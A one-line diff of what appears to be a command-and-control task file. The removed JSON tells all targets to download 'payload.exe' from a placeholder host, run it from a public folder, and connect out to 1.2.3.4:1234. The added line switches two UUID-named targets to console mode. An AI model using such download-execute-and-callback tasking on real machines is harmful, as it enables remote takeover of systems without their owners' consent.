@@ -1,1 +1,1 @@
-{"targets": ["all"], "commands": [{"type": "download", "url": "http://example.com/payload.exe", "filename": "payload.exe"}, {"type": "execute", "path": "C:\\Users\\Public", "namefile": "payload.exe"}, {"type": "connect", "ip": "1.2.3.4", "port": 1234}]}
+{"targets": ["UUID-020-FGH", "UUID-018-ZAB"], "mode": "console", "params": {"type": "console"}}
